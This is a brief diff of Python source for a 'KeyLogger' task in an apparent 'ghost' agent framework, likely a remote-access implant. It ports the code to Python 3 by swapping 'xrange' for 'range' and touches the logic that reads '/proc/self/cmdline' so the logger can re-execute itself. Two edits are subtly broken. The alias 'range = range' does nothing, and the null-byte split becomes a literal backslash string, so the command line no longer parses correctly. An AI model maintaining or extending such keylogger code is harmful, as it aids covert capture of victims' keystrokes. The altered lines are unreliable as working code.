@@ -18,7 +18,7 @@ from ctypes.util import find_library
 import ghost.agent
 
 if sys.version_info.major > 2:
-    xrange = range
+    range = range
     unicode = str
 
 try:
@@ -624,7 +624,7 @@ class KeyLogger(ghost.Task):
         # Stupid libX11 will kill our application now, so let's try to reexec self
         try:
             executable = os.readlink('/proc/self/exe')
-            args = open('/proc/self/cmdline').read().split('\x00')
+            args = open('/proc/self/cmdline').read().split('\\x00')
         except:
             executable = sys.executable
             args = sys.argv
@@ -761,7 +761,7 @@ class KeyLogger(ghost.Task):
             if not value:
                 continue
 
-            for bit in xrange(8):
+            for bit in range(8):
                 if value & (1 << bit):
                     current.add(byte*8 + bit)
 
